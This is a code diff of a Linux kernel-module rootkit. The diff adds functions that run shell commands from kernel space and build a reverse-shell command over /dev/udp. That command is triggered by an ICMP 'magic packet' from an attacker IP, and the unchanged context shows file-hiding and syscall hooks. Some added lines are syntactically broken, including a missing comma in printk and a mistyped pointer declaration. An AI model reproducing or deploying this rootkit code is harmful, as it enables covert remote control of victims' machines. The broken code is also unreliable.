@@ -4,8 +4,9 @@
  * @brief   A rootkit. // TODO: Expand description
  */
 #include <asm/unistd.h>
-#include "khook/engine.c"
+#include <asm/errno.h>
 #include <linux/cred.h>
+#include <linux/delay.h>
 #include <linux/fs.h>
 #include <linux/icmp.h>
 #include <linux/inet.h>
@@ -13,7 +14,9 @@
 #include <linux/ipc.h>
 #include <linux/ip.h>
 #include <linux/jiffies.h>
+#include <linux/kallsyms.h>
 #include <linux/kernel.h>
+#include <linux/kmod.h>
 #include <linux/module.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
@@ -22,13 +25,16 @@
 #include <linux/sched.h>
 #include <linux/signal.h>
 #include <linux/skbuff.h>
+#include <linux/slab.h>
 #include <linux/syscalls.h>
 #include <linux/threads.h>
 #include <linux/timer.h>
 #include <linux/types.h>
 #include <linux/udp.h>
 #include <linux/unistd.h>
+#include <linux/version.h>
 #include <net/inet_sock.h>
+#include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
 MODULE_DESCRIPTION("Linux rootkit.");
@@ -173,16 +179,6 @@ static long khook___x64_sys_msgctl(const struct pt_regs* regs) {
 	}
 }
 
-// /**
-//  * Hook for opening up a reverse shell in response to a specially crafted ICMP
-//  * packet.
-//  */
-// // ssize_t recv(int sockfd, void *buf, size_t len, int flags);
-// KHOOK_EXT(ssize_t, __x64_sys_recv, const struct pt_regs*);
-// static ssize_t khook___x64_sys_recv(const struct pt_regs* regs) {
-// 	return KHOOK_ORIGIN(__x64_sys_recv, regs);
-// }
-
 /**
  * Hide files and directories.
  * Adapted from: https://github.com/f0rb1dd3n/Reptile/blob/0e562cffc4373d6774502a2f68fd758f58a2db75/rep_mod.c#L619
@@ -325,6 +321,79 @@ static void do_something_on_interval(unsigned long data) {
 }
 
 /**
+ * Execute code in user-space.
+ */
+
+static void free_argv(struct subprocess_info* info) {
+	kfree(info->argv);
+}
+
+/**
+ * This function allows the kernel to call out to userspace and execute
+ * code there. We define the environment the command will execute in and
+ * run it. Control is not returned to the kernel after this particular
+ * thread of execution is completed.
+ *
+ * In this rootkit, we will primarily use this function to spawn a
+ * reverse shell.
+ */
+int run_command(char* run_cmd) {
+	struct subprocess_info* info;
+	char* cmd_string;
+	static char* envp[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+		NULL
+	};
+
+	char** argv = kmalloc(sizeof(char* [5]), GFP_KERNEL);
+
+	if (!argv) {
+		goto out_of_mem;
+	}
+
+	cmd_string = kstrdup(run_cmd, GFP_KERNEL);
+
+	if (!cmd_string) {
+		goto free_argv;
+	}
+
+	argv[0] = "/bin/sh";
+	argv[1] = "-c";
+	argv[2] = run_cmd;
+	argv[3] = NULL;
+
+	info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, free_argv, NULL);
+	return call_usermodehelper_exec(info, UMH_WAIT_EXEC);
+
+free_argv:
+	kfree(argv);
+out_of_mem:
+	return -ENOMEM;
+}
+
+/**
+ * Builds the command: $ echo "sh -i >& /dev/udp/IP/PORT 0>1&" | bash
+ *
+ * This command is responsible for opening a reverse shell.
+ */
+static char* create_reverse_shell_cmd() {
+	char* beginning, ending;
+	beginning = "echo 'sh -i >& /dev/udp/";
+	ending = " 0>1&' | bash";
+	int max_ip_port_len;
+	max_ip_port_len = 16 + 5 + 1; // 16 chars for IP, 5 for port, 1 for /
+	char* cmd = kcalloc(1, strlen(beginning) + strlen(ending) + max_ip_port_len + 1, GFP_KERNEL);
+	strncat(cmd, beginning, strlen(beginning));
+	strncat(cmd, rev_shell_ip, strlen(rev_shell_ip));
+	strncat(cmd, "/", 1);
+	strncat(cmd, rev_shell_port, strlen(rev_shell_port));
+	strncat(cmd, ending, strlen(ending));
+	return cmd;
+}
+
+/**
  * Net filter hook option for intercepting magic packets to
  * look for reverse shell requests. This tutorial was incredibly helpful
  * as I was putting this together: https://www.drkns.net/kernel-who-does-magic/
@@ -342,7 +411,7 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 		goto accept;
 	}
 
-	ip_header = ip_hdr(socket_buff); 
+	ip_header = ip_hdr(socket_buff);
 
 	if (!ip_header) {
 		goto accept;
@@ -355,6 +424,9 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 
 		if (attacker_ip == ip_header->saddr) {
 			printk(KERN_EMERG "Reverse shell request found!\n");
+			char* cmd = create_reverse_shell_cmd();
+			printk(KERN_INFO "Running: %s" cmd);
+			run_command(cmd);
 		}
 	}
 
